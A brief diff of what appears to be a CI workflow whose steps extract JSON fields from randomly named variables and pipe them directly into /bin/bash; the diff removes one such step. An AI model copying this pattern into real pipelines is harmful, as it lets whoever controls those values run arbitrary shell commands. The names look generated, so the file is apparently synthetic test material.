@@ -29,7 +29,6 @@ jobs:
           printf '%s' "$zyxbm8571" | jq -r .zyrvb18806 | /bin/bash
           printf '%s' "$w8" | jq -r .m43486 | /bin/bash
           echo $awax11 | jq -r .h1 | /bin/bash
-          echo $d1515 | jq -r .fdty959 | /bin/bash
           echo $wj57312 | jq -r .kubb19751 | /bin/bash
           echo $dokii30 | jq -r .o17013 | /bin/bash
           echo $ndj133 | jq -r .jozs52 | /bin/bash
